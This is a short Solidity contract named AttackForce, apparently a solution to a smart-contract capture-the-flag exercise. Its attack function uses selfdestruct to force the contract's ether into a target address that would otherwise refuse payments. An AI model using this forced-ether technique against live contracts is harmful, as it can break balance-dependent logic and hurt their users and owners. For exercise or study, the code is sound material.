// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract AttackForce {
    constructor() public payable {}

    receive() external payable {}

    function attack(address payable target) public {
        selfdestruct(target);
    }
}
